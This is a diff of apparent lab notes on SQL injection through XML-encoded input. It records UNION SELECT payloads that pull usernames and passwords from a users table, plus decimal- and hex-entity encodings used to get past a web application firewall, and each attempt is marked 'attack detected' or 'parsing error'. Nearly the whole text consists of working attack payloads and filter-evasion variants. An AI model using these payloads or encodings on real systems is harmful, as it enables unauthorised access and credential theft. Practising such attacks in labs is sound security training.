@@ -84,3 +84,11 @@ UNION SELECT username || '~' || password FROM users
 
 <@hex_entities>1 UNION SELECT username || &#39;~&#39; || password FROM users<@/hex_entities> det 
 <@hex_entities>1 	&#x55NION 	&#x53ELECT username || &#39;~&#39; || password FROM users<@/hex_entities> parsing error
+
+1 UNION SELECT NULL; attack detected 
+<@dec_entities> 1 UNION SELECT NULL <@/dec_entities>;   Attack detected
+https://v2.cryptii.com/text/htmlentities   Converter
+https://calculla.com/ascii_hex_table       Reference table
+<@dec_entities>&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;<@/dec_entities>;  XML parsing error
+<@dec_entities>&#49;<@/dec_entities>; XML parsing error
+1 <@dec_entities>&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;<@/dec_entities>;
